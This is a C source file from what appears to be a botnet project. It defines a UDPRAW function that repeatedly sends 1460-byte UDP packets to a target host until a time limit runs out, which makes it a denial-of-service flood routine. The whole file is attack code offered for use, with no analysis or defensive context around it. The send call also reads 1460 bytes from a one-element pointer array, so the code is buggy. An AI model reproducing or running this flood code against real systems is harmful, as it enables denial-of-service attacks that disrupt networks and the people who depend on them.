#include "../../includes/px_botnet.h"

void UDPRAW(unsigned char *ip, int port, int secs)
{
	int		string = socket(AF_INET, SOCK_DGRAM, 0);
	time_t	start = time(NULL) + secs;
	struct	sockaddr_in sin;
	struct	hostent *hp;
	char	*stringme[] = {"\x8f"};

	hp = gethostbyname(ip);
	bzero((char *)&sin, sizeof(sin));
	bcopy(hp->h_addr, (char *)&sin.sin_addr, hp->h_length);
	sin.sin_family = hp->h_addrtype;
	sin.sin_port = port;
	unsigned int a = 0;
	while (1)
	{
		if (a >= 50)
		{
			send(string, stringme, 1460, 0);
			connect(string, (struct sockaddr *)&sin, sizeof(sin));
			if (time(NULL) >= start)
			{
				close(string);
				return ;
			}
			a = 0;
		}
		a++;
	}
}
